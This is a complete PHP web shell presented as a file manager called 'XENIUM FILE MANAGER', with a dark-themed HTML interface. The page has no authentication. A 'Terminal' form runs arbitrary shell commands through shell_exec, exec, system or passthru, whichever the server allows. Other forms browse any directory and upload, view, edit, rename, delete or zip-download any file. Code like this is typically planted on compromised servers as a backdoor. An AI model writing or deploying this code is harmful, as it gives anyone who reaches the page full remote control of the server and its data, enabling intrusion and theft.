<?php
@ini_set('display_errors', '1');
@ini_set('log_errors', '1');
error_reporting(E_ALL);

session_start();

if (!isset($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

function validatePath($path) {
    $realPath = realpath($path);
    if ($realPath && (is_file($realPath) || is_dir($realPath))) {
        return $realPath;
    }
    return false;
}

$notification = '';
$errorMsg = '';

function executeCommand($command) {
    if (empty(trim($command))) {
        return "No command provided";
    }
    
    $result = '';
    $executionMethods = ['shell_exec', 'exec', 'system', 'passthru'];

    foreach ($executionMethods as $method) {
        if (function_exists($method) && is_callable($method)) {
            try {
                if ($method === 'exec') {
                    $output = [];
                    @exec($command . ' 2>&1', $output);
                    $result = implode("\n", $output);
                } elseif ($method === 'shell_exec') {
                    $result = @shell_exec($command . ' 2>&1');
                } elseif ($method === 'system') {
                    ob_start();
                    @system($command . ' 2>&1');
                    $result = ob_get_clean();
                } elseif ($method === 'passthru') {
                    ob_start();
                    @passthru($command . ' 2>&1');
                    $result = ob_get_clean();
                }
                
                if ($result !== false && !empty(trim($result))) {
                    return $result;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
    return "Command execution not available";
}

if (isset($_POST['navigate'])) {
    $targetDir = $_POST['navigate'];
    if (is_dir($targetDir)) {
        $_SESSION['current_dir'] = validatePath($targetDir);
        $notification = 'Directory changed successfully';
    }
}

if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] !== UPLOAD_ERR_NO_FILE) {
    if ($_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['file_upload']['name']);
        $uploadPath = rtrim($_SESSION['current_dir'], '/\\') . DIRECTORY_SEPARATOR . $fileName;
        
        // Additional security check
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $errorMsg = 'Upload failed: Invalid filename';
        } elseif (!is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Upload failed: Directory not writable';
        } elseif (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
            @chmod($uploadPath, 0644);
            $notification = 'File uploaded successfully';
        } else {
            $errorMsg = 'Upload failed: Could not move file. Check directory permissions.';
        }
    } else {
        $uploadErrors = [
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
        ];
        $errorMsg = 'Upload error: ' . ($uploadErrors[$_FILES['file_upload']['error']] ?? 'Unknown error');
    }
}

if (isset($_POST['remove'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['remove']);
    
    if ($targetPath === false) {
        $errorMsg = 'Delete failed: Invalid path';
    } elseif (is_file($targetPath)) {
        if (@unlink($targetPath)) {
            $notification = 'File deleted';
        } else {
            $errorMsg = 'Delete failed: Permission denied or file in use';
        }
    } elseif (is_dir($targetPath)) {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            
            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }
            
            if (@rmdir($targetPath)) {
                $notification = 'Directory deleted';
            } else {
                $errorMsg = 'Delete failed: Could not remove directory';
            }
        } catch (Exception $e) {
            $errorMsg = 'Delete failed: ' . $e->getMessage();
        }
    } else {
        $errorMsg = 'Delete failed: Path not found';
    }
}

if (isset($_POST['old_name'], $_POST['new_name'])) {
    $sourcePath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['old_name']);
    
    if ($sourcePath === false) {
        $errorMsg = 'Rename failed: Source not found';
    } else {
        $destinationPath = dirname($sourcePath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        
        if (file_exists($destinationPath)) {
            $errorMsg = 'Rename failed: Target name already exists';
        } elseif (@rename($sourcePath, $destinationPath)) {
            $notification = 'Rename successful';
        } else {
            $errorMsg = 'Rename failed: Permission denied or invalid name';
        }
    }
}

if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
    $editPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['file_to_edit']);
    
    if ($editPath === false || !is_file($editPath)) {
        $errorMsg = 'Edit failed: File not found';
    } elseif (!is_writable($editPath)) {
        $errorMsg = 'Edit failed: File not writable';
    } elseif (@file_put_contents($editPath, $_POST['file_content']) !== false) {
        $notification = 'File saved';
    } else {
        $errorMsg = 'Edit failed: Could not write to file';
    }
}

if (isset($_POST['create_file']) && trim($_POST['create_file']) !== '') {
    $fileName = basename($_POST['create_file']);
    $newFilePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;
    
    // Security check
    if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
        $errorMsg = 'Create failed: Invalid filename';
    } elseif (file_exists($newFilePath)) {
        $errorMsg = 'Create failed: File already exists';
    } elseif (!is_writable($_SESSION['current_dir'])) {
        $errorMsg = 'Create failed: Directory not writable';
    } elseif (@file_put_contents($newFilePath, '') !== false) {
        @chmod($newFilePath, 0644);
        $notification = 'File created';
    } else {
        $errorMsg = 'Create failed: Could not create file';
    }
}

if (isset($_POST['create_folder']) && trim($_POST['create_folder']) !== '') {
    $folderName = basename($_POST['create_folder']);
    $newFolderPath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $folderName;
    
    // Security check
    if (strpos($folderName, '..') !== false || strpos($folderName, '/') !== false || strpos($folderName, '\\') !== false) {
        $errorMsg = 'Create failed: Invalid folder name';
    } elseif (file_exists($newFolderPath)) {
        $errorMsg = 'Create failed: Folder already exists';
    } elseif (!is_writable($_SESSION['current_dir'])) {
        $errorMsg = 'Create failed: Directory not writable';
    } elseif (@mkdir($newFolderPath, 0755)) {
        $notification = 'Folder created';
    } else {
        $errorMsg = 'Create failed: Could not create folder';
    }
}

 $currentDirectory = $_SESSION['current_dir'];
 $directoryContents = scandir($currentDirectory);
 $folders = $files = [];

foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    $fullPath = $currentDirectory . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders);
sort($files);
 $allItems = array_merge($folders, $files);

 $fileToEdit = $_POST['edit'] ?? null;
 $fileToView = $_POST['view'] ?? null;
 $itemToRename = $_POST['rename'] ?? null;
 $fileContent = $fileToEdit ? @file_get_contents($currentDirectory . '/' . $fileToEdit) : null;
 $viewContent = $fileToView ? @file_get_contents($currentDirectory . '/' . $fileToView) : null;

// Handle bulk delete
if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    $deleted = 0;
    $failed = 0;
    
    foreach ($_POST['selected_items'] as $item) {
        $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
        
        if ($targetPath === false) {
            $failed++;
            continue;
        }
        
        if (is_file($targetPath)) {
            if (@unlink($targetPath)) {
                $deleted++;
            } else {
                $failed++;
            }
        } elseif (is_dir($targetPath)) {
            try {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                
                foreach ($iterator as $file) {
                    if ($file->isDir()) {
                        @rmdir($file->getRealPath());
                    } else {
                        @unlink($file->getRealPath());
                    }
                }
                
                if (@rmdir($targetPath)) {
                    $deleted++;
                } else {
                    $failed++;
                }
            } catch (Exception $e) {
                $failed++;
            }
        }
    }
    
    if ($deleted > 0) {
        $notification = "Deleted $deleted item(s)";
    }
    if ($failed > 0) {
        $errorMsg = "Failed to delete $failed item(s)";
    }
}

// Handle bulk download
if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    if (class_exists('ZipArchive')) {
        $zipName = 'selected_files_' . time() . '.zip';
        $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
        
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($_POST['selected_items'] as $item) {
                $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
                
                if ($targetPath === false) continue;
                
                if (is_file($targetPath)) {
                    $zip->addFile($targetPath, basename($targetPath));
                } elseif (is_dir($targetPath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    
                    foreach ($files as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = basename($targetPath) . '/' . substr($filePath, strlen($targetPath) + 1);
                        
                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                }
            }
            
            $zip->close();
            
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zipName . '"');
            header('Content-Length: ' . filesize($zipPath));
            readfile($zipPath);
            @unlink($zipPath);
            exit;
        } else {
            $errorMsg = 'Bulk download failed: Could not create zip file';
        }
    } else {
        $errorMsg = 'Bulk download failed: ZipArchive not available';
    }
}

// Handle file/folder download
if (isset($_POST['download'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['download']);
    
    if ($targetPath === false) {
        $errorMsg = 'Download failed: Invalid path';
    } elseif (is_file($targetPath)) {
        // Direct file download
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
        header('Content-Length: ' . filesize($targetPath));
        readfile($targetPath);
        exit;
    } elseif (is_dir($targetPath)) {
        // Zip folder and download
        if (class_exists('ZipArchive')) {
            $zipName = basename($targetPath) . '_' . time() . '.zip';
            $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
            
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                
                foreach ($files as $file) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($targetPath) + 1);
                    
                    if ($file->isDir()) {
                        $zip->addEmptyDir($relativePath);
                    } else {
                        $zip->addFile($filePath, $relativePath);
                    }
                }
                
                $zip->close();
                
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipName . '"');
                header('Content-Length: ' . filesize($zipPath));
                readfile($zipPath);
                @unlink($zipPath);
                exit;
            } else {
                $errorMsg = 'Download failed: Could not create zip file';
            }
        } else {
            $errorMsg = 'Download failed: ZipArchive not available';
        }
    }
}

$commandResult = '';
$commandAvailable = false;

// Check if any command execution function is available
$executionMethods = ['shell_exec', 'exec', 'system', 'passthru'];

foreach ($executionMethods as $method) {
    if (function_exists($method) && is_callable($method)) {
        $commandAvailable = true;
        break;
    }
}

if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== '') {
    $cmd = trim($_POST['terminal_command']);
    if (!empty($cmd)) {
        try {
            $commandResult = executeCommand($cmd);
            if (empty(trim($commandResult)) || $commandResult === "Command execution not available") {
                $errorMsg = 'Command execution: No output or function disabled';
            }
        } catch (Exception $e) {
            $errorMsg = 'Command error: ' . htmlspecialchars($e->getMessage());
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XENIUM FILE MANAGER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a1b1e;
            color: #e4e6eb;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            font-size: 13px;
            line-height: 1.5;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 16px;
            font-weight: 500;
            color: #e4e6eb;
            margin-bottom: 4px;
            letter-spacing: -0.01em;
        }
        
        .subtitle {
            color: #9ca3af;
            font-size: 13px;
            margin-bottom: 20px;
            font-weight: 400;
        }
        
        .alert {
            padding: 10px 12px;
            border-radius: 4px;
            margin-bottom: 12px;
            font-size: 13px;
            border: 1px solid;
        }
        
        .alert-success {
            background: rgba(34, 197, 94, 0.1);
            border-color: rgba(34, 197, 94, 0.3);
            color: #22c55e;
        }
        
        .alert-danger {
            background: rgba(239, 68, 68, 0.1);
            border-color: rgba(239, 68, 68, 0.3);
            color: #ef4444;
        }
        
        .section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            padding: 14px;
            margin-bottom: 12px;
        }
        
        .section-title {
            font-size: 13px;
            font-weight: 500;
            color: #e4e6eb;
            margin-bottom: 10px;
        }
        
        .input-group {
            display: flex;
            gap: 6px;
            margin-bottom: 6px;
        }
        
        .input-group:last-child {
            margin-bottom: 0;
        }
        
        input[type="text"],
        input[type="file"],
        textarea {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 10px;
            color: #e4e6eb;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            font-size: 13px;
            transition: all 0.15s ease;
            outline: none;
            flex: 1;
        }
        
        input[type="text"]:focus,
        textarea:focus {
            border-color: rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.3);
        }
        
        input[type="file"] {
            cursor: pointer;
            padding: 6px 10px;
        }
        
        input[type="file"]::file-selector-button {
            background: rgba(255, 255, 255, 0.06);
            color: #e4e6eb;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 12px;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.15s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            margin-right: 10px;
        }
        
        input[type="file"]::file-selector-button:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        textarea {
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            resize: vertical;
            min-height: 400px;
            height: 500px;
            line-height: 1.5;
            font-size: 12px;
            width: 100%;
            display: block;
        }
        
        .btn {
            background: rgba(255, 255, 255, 0.06);
            color: #e4e6eb;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 12px;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.15s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            white-space: nowrap;
        }
        
        .btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        .btn:active {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .btn-primary {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.3);
        }
        
        .btn-primary:hover {
            background: rgba(34, 197, 94, 0.25);
            border-color: rgba(34, 197, 94, 0.4);
        }
        
        .btn-create {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.3);
        }
        
        .btn-create:hover {
            background: rgba(34, 197, 94, 0.25);
            border-color: rgba(34, 197, 94, 0.4);
        }
        
        .btn-danger {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-color: rgba(239, 68, 68, 0.3);
        }
        
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.25);
            border-color: rgba(239, 68, 68, 0.4);
        }
        
        .btn-sm {
            padding: 4px 10px;
            font-size: 12px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            overflow: hidden;
        }
        
        thead {
            background: rgba(255, 255, 255, 0.03);
        }
        
        th {
            padding: 8px 12px;
            font-weight: 500;
            text-align: left;
            color: #9ca3af;
            font-size: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
        
        td {
            padding: 8px 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 13px;
        }
        
        tbody tr {
            transition: background 0.15s ease;
        }
        
        tbody tr:hover {
            background: rgba(255, 255, 255, 0.03);
        }
        
        .file-icon {
            display: inline-block;
            width: 14px;
            text-align: center;
            margin-right: 6px;
            opacity: 0.6;
            font-size: 11px;
        }
        
        .file-name {
            color: #e4e6eb;
            font-weight: 400;
        }
        
        .type-writable {
            color: #22c55e;
            font-size: 12px;
        }
        
        .type-readonly {
            color: #ef4444;
            font-size: 12px;
        }
        
        .action-buttons {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }
        
        .action-buttons form {
            margin: 0;
        }
        
        .action-buttons .btn {
            padding: 4px 8px;
            font-size: 12px;
        }
        
        .rename-form {
            display: flex;
            gap: 6px;
            align-items: center;
        }
        
        .rename-form input {
            flex: 1;
            padding: 4px 8px;
            font-size: 13px;
        }
        
        .code-block {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            padding: 12px;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.5;
            color: #e4e6eb;
            overflow-x: auto;
            white-space: pre;
        }
        
        .terminal-output {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(34, 197, 94, 0.3);
            border-radius: 4px;
            padding: 12px;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            font-size: 12px;
            color: #22c55e;
            overflow-x: auto;
            white-space: pre;
            line-height: 1.5;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        @media (max-width: 768px) {
            .grid-2 {
                grid-template-columns: 1fr;
            }
            
            body {
                padding: 12px;
            }
            
            .action-buttons {
                justify-content: flex-start;
            }
        }
        
        .up-btn {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #e4e6eb;
            margin-bottom: 12px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .up-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        .bulk-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            margin-bottom: 12px;
            padding: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
        }
        
        .bulk-actions-text {
            color: #9ca3af;
            font-size: 13px;
            margin-right: auto;
        }
        
        input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            background: rgba(0, 0, 0, 0.3);
            cursor: pointer;
            position: relative;
            transition: all 0.15s ease;
        }
        
        input[type="checkbox"]:hover {
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(0, 0, 0, 0.4);
        }
        
        input[type="checkbox"]:checked {
            background: rgba(34, 197, 94, 0.2);
            border-color: #22c55e;
        }
        
        input[type="checkbox"]:checked::after {
            content: '✓';
            position: absolute;
            top: -1px;
            left: 2px;
            color: #22c55e;
            font-size: 12px;
            font-weight: bold;
        }
        
        th input[type="checkbox"] {
            margin: 0;
        }
        
        td input[type="checkbox"] {
            margin-right: 8px;
        }
    </style>
    <script>
        function toggleSelectAll(checkbox) {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(cb => cb.checked = checkbox.checked);
            updateBulkActions();
        }
        
        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]:checked');
            const bulkActions = document.getElementById('bulk-actions');
            const countText = document.getElementById('selected-count');
            
            if (checkboxes.length > 0) {
                bulkActions.style.display = 'flex';
                countText.textContent = checkboxes.length + ' item(s) selected';
            } else {
                bulkActions.style.display = 'none';
            }
        }
    </script>
</head>
<body>
<div class="container">
    <h1>XENIUM FILE MANAGER</h1>
    <p class="subtitle">Navigate and manage your files</p>

    <?php if ($notification): ?>
        <div class="alert alert-success"><?= htmlentities($notification) ?></div>
    <?php endif; ?>
    
    <?php if ($errorMsg): ?>
        <div class="alert alert-danger"><?= htmlentities($errorMsg) ?></div>
    <?php endif; ?>

    <div class="section">
        <div class="section-title">Current Directory</div>
        <form method="post" class="input-group">
            <input type="text" name="navigate" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path...">
            <button class="btn" type="submit">Navigate</button>
        </form>
    </div>

    <div class="grid-2">
        <div class="section">
            <div class="section-title">Upload File</div>
            <form method="post" enctype="multipart/form-data">
                <div class="input-group">
                    <input type="file" name="file_upload">
                    <button class="btn btn-primary" type="submit">Upload</button>
                </div>
            </form>
        </div>

        <div class="section">
            <div class="section-title">Create New</div>
            <form method="post" class="input-group">
                <input type="text" name="create_file" placeholder="New file name...">
                <button class="btn btn-create" type="submit">File</button>
            </form>
            <form method="post" class="input-group">
                <input type="text" name="create_folder" placeholder="New folder name...">
                <button class="btn btn-create" type="submit">Folder</button>
            </form>
        </div>
    </div>

    <?php if ($fileToView && $viewContent !== null): ?>
        <div class="section">
            <div class="section-title">Viewing: <?= htmlentities($fileToView) ?></div>
            <textarea readonly><?= htmlentities($viewContent) ?></textarea>
        </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
        <div class="section">
            <div class="section-title">Editing: <?= htmlentities($fileToEdit) ?></div>
            <form method="post">
                <input type="hidden" name="file_to_edit" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="file_content"><?= htmlentities($fileContent) ?></textarea>
                <div style="margin-top: 12px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <?php if ($commandAvailable): ?>
    <div class="section">
        <div class="section-title">Terminal</div>
        <form method="post" class="input-group">
            <input type="text" name="terminal_command" placeholder="Enter command...">
            <button class="btn btn-create" type="submit">Execute</button>
        </form>
        <?php if ($commandResult): ?>
            <div class="terminal-output" style="margin-top: 12px;"><?= htmlentities($commandResult) ?></div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <form method="post">
        <button name="navigate" value="<?= dirname($currentDirectory) ?>" class="btn up-btn">← Parent Directory</button>
    </form>

    <form method="post" id="file-form">
        <div id="bulk-actions" class="bulk-actions" style="display: none;">
            <span class="bulk-actions-text" id="selected-count">0 item(s) selected</span>
            <button type="submit" name="bulk_download" class="btn btn-sm" onclick="return confirm('Download selected items as zip?')">Download Selected</button>
            <button type="submit" name="bulk_delete" class="btn btn-danger btn-sm" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
        </div>

    <table>
        <thead>
            <tr>
                <th style="width: 40px;">
                    <input type="checkbox" onclick="toggleSelectAll(this)">
                </th>
                <th>Name</th>
                <th>Type</th>
                <th style="text-align: right;">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . '/' . $item;
            $isDirectory = is_dir($fullPath);
            $canWrite = is_writable($fullPath);
        ?>
            <tr>
                <td>
                    <input type="checkbox" name="selected_items[]" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()">
                </td>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        </form>
                        <form method="post" class="rename-form">
                            <input type="hidden" name="old_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="new_name" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-primary btn-sm" type="submit">Save</button>
                        </form>
                        <form method="post" id="file-form">
                    <?php else: ?>
                        <span class="file-icon"><?= $isDirectory ? '/' : '' ?></span>
                        <span class="file-name"><?= htmlentities($item) ?></span>
                    <?php endif; ?>
                </td>
                <td>
                    <span class="<?= $canWrite ? 'type-writable' : 'type-readonly' ?>">
                        <?= $isDirectory ? 'Folder' : 'File' ?>
                    </span>
                </td>
                <td>
                    <div class="action-buttons">
                    <?php if ($isDirectory): ?>
                        <form method="post">
                            <button name="navigate" value="<?= $fullPath ?>" class="btn btn-sm">Open</button>
                        </form>
                    <?php else: ?>
                        <form method="post">
                            <button name="view" value="<?= $item ?>" class="btn btn-sm">View</button>
                        </form>
                        <form method="post">
                            <button name="edit" value="<?= $item ?>" class="btn btn-sm">Edit</button>
                        </form>
                    <?php endif; ?>
                        <form method="post">
                            <button name="download" value="<?= $item ?>" class="btn btn-sm">Download</button>
                        </form>
                        <form method="post">
                            <button name="rename" value="<?= $item ?>" class="btn btn-sm">Rename</button>
                        </form>
                        <form method="post">
                            <button name="remove" value="<?= $item ?>" class="btn btn-danger btn-sm" onclick="return confirm('Delete this item?')">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    </form>
</div>
</body>
</html>
